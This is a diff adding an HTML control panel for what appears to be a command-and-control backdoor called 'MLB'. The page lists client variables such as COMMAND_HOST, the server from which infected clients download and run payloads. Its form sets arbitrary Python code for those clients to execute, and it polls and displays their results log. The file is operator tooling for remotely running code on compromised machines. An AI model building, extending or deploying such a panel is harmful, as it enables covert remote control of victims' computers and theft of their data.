@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+	<!--
+	This is very basic. It can only set payload and access some logs. You should customize it.
+	-->
+	<head>
+		<meta charset="UTF-8">
+		<title>MLB - control panel</title>
+		<style>
+			html, body, head{
+				margin: 0;
+				padding: 0;
+				background-color: black;
+			}
+			
+			*{
+				font-family: monospace;
+				color: white;
+				box-sizing: border-box
+			}
+			#main{
+				margin: auto;
+				width: 700px;
+				border: solid green 1px;
+				background-color: #001100;
+				padding: 10px
+			}
+			
+			textarea{
+				width: 100%;
+				height: 600px;
+				border: solid green 1px;
+				background-color: darkgreen;
+			}
+			
+			input{
+				border: solid green 1px;
+				background-color: darkgreen;
+			}
+			
+			#log{
+				max-height: 600px;
+				overflow: scroll;
+			}
+		</style>
+	</head>
+	<body>
+		<div id="main">
+			<h1>Welcome to control panel!</h1>
+			<hr>
+			<p><b>Variables that are on the client side:</b></p>
+			<p>
+				COMMAND_HOST - URL from where payload is downloaded (ONLY HOST AND SCHEME, no route e.g. http://228.626.420.69:1488 )<br>
+				REQUESTS_DELAY - time between every payload download<br>
+				REPORT_RESULTS - Should it report results back to server (probably should)<br>
+				REQ_FAILED_TIME_WAIT - how much time to wait if request for payload failed<br>
+				PAYLOAD_ROUTE - where on server payload is found<br>
+				RESULTS_ROUTE - where to send results<br>
+				DO_REQUESTS_CHECK - check if requests library is installed (it probably is, otherwise you're screwed)<br>
+				Identation is 4 spaces!!<br>
+				<b>You can also use the send_message(your_message) function to make messages appear in the log below.</b>
+			</p>
+			<form action="{{control-panel-route}}/set-payload" method="POST">
+				<textarea name="payload" placeholder="Payload that will be executed (python code)"></textarea>
+				<input type="password" name="token" placeholder="Your token here.">
+				<input type="checkbox" name="exec-once" id="eo">
+				<label for="eo">Execute payload only once?</label>
+				<br><p>----</p><br>
+				<input type="submit" />
+			</form>
+			<hr>
+			<h2>LOG:</h2>
+			<div id="log">
+				<p id="logp"></p>
+			</div>
+		</div>
+	</body>
+	<script>
+		async function update_logs(){
+			let logs = await fetch("{{control-panel-route}}/log");
+			logs = await logs.text();
+			document.getElementById("logp").innerHTML = logs;
+		}
+		
+		setInterval(update_logs, 5000);
+	</script>
+</html>
